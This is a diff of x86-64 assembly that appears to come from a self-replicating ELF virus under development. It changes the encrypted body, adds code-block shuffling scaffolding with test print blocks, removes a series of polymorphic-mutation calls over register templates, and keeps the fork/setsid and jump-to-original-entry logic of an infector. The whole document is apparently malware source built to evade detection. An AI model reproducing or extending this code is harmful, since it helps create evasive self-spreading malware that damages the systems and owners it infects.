@@ -1,6 +1,97 @@
 _encrypted_start:
+	jmp		encrypted_start
+	%include "functions/patchjmp.s"
+	%include "functions/shuffle.s"
+	encrypted_start:
 
     PUSH_ALL
+
+
+
+	jmp	[rel .addr0r]
+	.addr0:	dq 0x421900000000
+	.addr0r: dq 0
+	start_shuffle:
+
+	; BLOC 0
+	dq	1942, 0
+	bloc0:
+	mov	rax, 1
+	mov	rdi, 1
+	jmp	msg0
+	db  'SALUT'
+	db 	'0', 10, 0
+	msg0:
+	lea	rsi, [rel msg0 - 3]
+	mov	rdx, 2
+	syscall
+	jmp	[rel .addr1r]
+	.addr1: dq 0x421900000001
+	.addr1r: dq 0
+	dq 0x696900000001
+
+
+	; BLOC 1
+	dq	1942, 1
+	bloc1:
+	mov	rax, 1
+	mov	rdi, 1
+	jmp	msg1
+	db  'BONJOUR'
+	db 	'1', 10, 0
+	msg1:
+	lea	rsi, [rel msg1 - 3]
+	mov	rdx, 2
+	syscall
+	jmp	[rel .addr2r]
+	.addr2: dq 0x421900000002
+	.addr2r: dq 0
+	dq 0x696900000002
+
+
+	; BLOC 2
+	dq	1942, 2
+	bloc2:
+	mov	rax, 1
+	mov	rdi, 1
+	jmp	msg2
+	db  'AHAHAH'
+	db 	'2', 10, 0
+	msg2:
+	lea	rsi, [rel msg2 - 3]
+	mov	rdx, 2
+	syscall
+	jmp	[rel .addr3r]
+	.addr3: dq 0x421900000003
+	.addr3r: dq 0
+	dq 0x696900000003
+
+	; BLOC 2
+	dq	1942, 3
+	bloc3:
+	mov	rax, 1
+	mov	rdi, 1
+	jmp	msg3
+	db  'AHAHAH'
+	db 	'3', 10, 0
+	msg3:
+	lea	rsi, [rel msg3 - 3]
+	mov	rdx, 3
+	syscall
+	jmp	[rel .addr4r]
+	.addr4: dq 0x421900000004
+	.addr4r: dq 0
+	dq 0x696900000004
+
+
+
+
+	end_shuffle:
+	dq	1942, 4
+	end_code:
+
+
+
 
 	mov		rdi, [rbp + 16]
 	add		rdi, mydata.path
@@ -11,7 +102,10 @@ _encrypted_start:
 	NOP
 	NOP
 	NOP
+
+	NOP
 	rep		stosq
+	NOP
 
 	mov		rax, [rbp + 16]
 	add		rax, mydata.path
@@ -37,46 +131,15 @@ _encrypted_start:
 	inc		rax
 	mov		[rax], byte '/'
 	inc		rax
+	; bloc 0
+
+
+
 
 	mov		rax, [rbp + 8]
 	;lea		rax, [rel _start]
-
 	mov		rdi, [rbp + 16]
 	;lea		rdi, [rel _stop]
-
-
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_rdi
-	mov		r8, 7
-	mov		r9, 4
-
-	%include "functions/polymorhp.s"
-
-
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_rax
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_rsi
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_rdx
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_rcx
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_r10
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_r11
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_r13
-	call	polymorph
-	mov		rdx, [rbp + 16]
-	add		rdx, mydata.templates_r15
-	call	polymorph
 
 
 	mov		rax, SYS_open
@@ -105,6 +168,7 @@ _encrypted_start:
 	mov		r10, 10
 	syscall
 
+
 	.just_quit:
 	mov		rax, SYS_close
 	mov		rdi, r12
@@ -112,16 +176,24 @@ _encrypted_start:
 
 	POP_ALL
 
+
+
 	mov		rax, [rbp + 16]
 	add		rax, mydata.zero
 	mov		al, BYTE [rax]	; SI ICI = 0, ca signfiie c'est war
 	test	al, al
 	jz		.continue
 
+
 	mov		rax, SYS_fork
 	syscall
+
+
 	cmp		eax, 0
 	jng		.continue_fork
+
+
+
 
 
 	mov		rax, [rbp + 16]
@@ -149,10 +221,15 @@ _encrypted_start:
 	add		rax, mydata.new_entry
 	mov		[rax], rdi
 
+
+
+
 	add		rsp, 64
 	jmp		[rax]
 
+
 .continue_fork:
+
 	mov		rax, SYS_setsid
 	syscall
 .continue:
